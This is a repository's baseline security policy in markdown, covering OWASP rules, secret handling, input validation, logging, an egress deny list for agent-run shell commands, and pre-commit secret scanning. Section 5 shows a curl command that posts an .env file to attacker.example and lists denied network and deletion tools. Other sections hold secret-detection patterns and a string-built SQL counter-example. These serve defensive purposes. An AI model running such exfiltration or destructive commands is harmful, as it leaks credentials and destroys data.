# Security

Baseline security rules for every stack. Stack-specific files may extend but not override these.

## 1. OWASP Top-10 (applied to internal apps)

1. **Broken Access Control** — default deny. Every route/handler declares the required role. Integration tests cover allowed + forbidden paths.
2. **Cryptographic Failures** — no homegrown crypto; use language stdlib (`cryptography`, `System.Security.Cryptography`, `SubtleCrypto`). TLS required for all HTTP calls.
3. **Injection** — parameterize every SQL query. No string concatenation into SQL, shell, or HTML. Use prepared statements / ORMs / `sqlc`.
4. **Insecure Design** — threat-model every new feature (Spoofing, Tampering, Repudiation, Info Disclosure, DoS, EoP). Record decisions in the spec.
5. **Security Misconfiguration** — ship secure defaults; document every non-default. No debug endpoints in production. CORS allow-list, never `*`.
6. **Vulnerable Components** — pin dependencies. Run `pip-audit` / `dotnet list package --vulnerable` / `npm audit` in CI. Patch critical CVEs within 7 days.
7. **Identification & Authentication Failures** — rely on the org SSO (OIDC/SAML). No custom password auth. Rotate tokens; default session lifetime ≤8h.
8. **Software & Data Integrity Failures** — signed artifacts only; verify checksums on downloads. CI pipelines are signed.
9. **Logging & Monitoring Failures** — structured logs, correlation IDs, ship to the org sink. Alert on auth failures and 5xx spikes.
10. **SSRF** — outbound HTTP is allow-listed per service. No user-supplied URLs fetched without a network-level allow-list.

## 2. Secret handling

1. Secrets live in the org secret store (Key Vault / ADO variable groups). `.env` is for local dev only.
2. Never commit `.env`. `.env.example` is the contract — it lists every key with a placeholder.
3. Session logs redact any key matching `(?i)(secret|token|key|password|passwd|pwd|api[_-]?key|auth)`.
4. Pre-commit hook scans for high-entropy strings (`gitleaks` or equivalent). CI runs the same scan as a guard.
5. If you suspect a secret leaked: rotate immediately, then open an incident — order matters.

## 3. Input validation

1. Validate at the **boundary** (HTTP handler, CLI parser, message consumer). Do not re-validate in the core; trust the type.
2. Use a schema validator: `pydantic` (Python), `zod` (TS), data-annotations + FluentValidation (.NET).
3. Reject unknown fields by default (strict mode). Returning `400 Bad Request` is correct behavior.
4. Cap input sizes explicitly (JSON body, file upload, query-param length).
5. Canonicalize paths before use — reject `..`, absolute paths, and symlinks escaping the workspace root.

## 4. Logging (security-aware)

1. Log request id, user id, tenant id, and outcome. **Never** log request bodies, tokens, or PII.
2. Use structured logging (JSON). One event per line.
3. Log levels:
   - `ERROR` — operator must investigate (5xx, integrity violation).
   - `WARN` — retry-able anomaly (transient 502, rate-limit hit).
   - `INFO` — business event (order created, workflow completed).
   - `DEBUG` — developer-only, off in prod.
4. Treat log output as untrusted input downstream: escape newlines in user-supplied fields to prevent log injection.

## 5. Egress policy for agents

Agent-run Bash is the fastest exfiltration path in a developer box:
one `curl -X POST -d @/workspace/.env https://attacker.example` and
the keys are gone. Soup therefore denies raw network clients in
`.claude/settings.json` and funnels egress through a small set of
audited tools.

### Denied

`curl`, `wget`, `nc`, `ncat`, `socat`, `telnet`, `ssh`, `scp`,
`rsync`. Also explicitly: `find ... -delete` and `find ... -exec rm`
(destructive re-entry paths that the generic `find:*` allow would
otherwise admit).

These are denied at the permission layer — Claude Code refuses the
tool call before anything touches the network.

### Allowed egress tools (and why)

- **`gh`** — authenticated via `gh auth login` / `GITHUB_TOKEN`;
  subject to GitHub's audit log; only talks to `api.github.com`.
- **`az`** — ditto for Azure / ADO; scoped to the tenant the operator
  is logged into.
- **`python` with `httpx`** — use when an MCP server, gateway, or
  allow-listed API is required. Direct calls go through an
  allow-listed host set in the caller; never reach out to an
  arbitrary URL an agent synthesized.

### If you need to fetch something

1. First preference: add it to the RAG store (`just rag-ingest`). The
   retrieval pipeline already lives in the egress allow-list.
2. Second preference: commit the artifact into the repo and read it
   locally.
3. Last resort: write a small Python script that uses `httpx` with an
   explicit host check, land it in `cli_wrappers/`, and call it from
   the agent. Do not invent one-off shell `curl` calls.

## 6. Pre-commit hook required

Constitution Art. VI.3 mandates pre-commit scanning for high-entropy
strings and common key prefixes. The shipped hook lives at
`.githooks/pre-commit`; install it once per clone with:

```sh
just install-hooks
```

which sets `core.hooksPath` to `.githooks` so every `git commit` runs
the scan. The hook blocks on matches of:

- key-like env assignments (`GITHUB_TOKEN=`, `ADO_PAT=`,
  `ANTHROPIC_API_KEY=`, `AWS_SECRET_ACCESS_KEY=`, ...),
- provider-scoped prefixes (`ghp_`, `ghs_`, `gho_`, `ghu_`, `ghr_`,
  `AKIA`, `ASIA`, `sk-ant-`, `xoxb-`, `xoxp-`, `xoxo-`),
- PEM headers (`-----BEGIN * PRIVATE KEY-----`),
- lines that look high-entropy **and** are assigned to a key-like
  identifier.

CI runs the same script as a guard (see the `Security misconfig`
guidance in §1 — mechanism, not merely intent).

If the hook blocks a legitimate change (e.g. you are editing test
fixtures with synthetic strings), annotate the line with
`# pragma: allowlist-secret` and the scanner will skip it. Annotate
sparingly; every use is auditable via `git grep`.

## 7. Examples

```python
# GOOD — boundary validation with pydantic.
class CreateUser(BaseModel):
    email: EmailStr
    display_name: constr(min_length=1, max_length=100)
    model_config = ConfigDict(extra="forbid")

@app.post("/users")
def create_user(body: CreateUser, user: CurrentUser = Depends(require_admin)):
    ...
```

```python
# BAD — string-built SQL.
query = f"SELECT * FROM users WHERE email = '{email}'"   # injection!
# GOOD — parameterized.
cur.execute("SELECT * FROM users WHERE email = %s", (email,))
```
